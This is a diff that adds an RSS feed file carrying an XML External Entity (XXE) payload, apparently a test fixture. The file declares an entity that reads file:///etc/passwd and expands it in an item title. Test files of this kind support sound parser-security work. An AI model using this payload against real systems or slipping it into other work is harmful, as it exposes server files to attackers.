@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="windows-1252"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<rss version="2.0">
+  <channel>
+     <item>
+      <title>RSS &xxe;</title>
+          </item>
+   <item>
+      <title>test</title>
+          </item>
+  </channel>
+</rss>
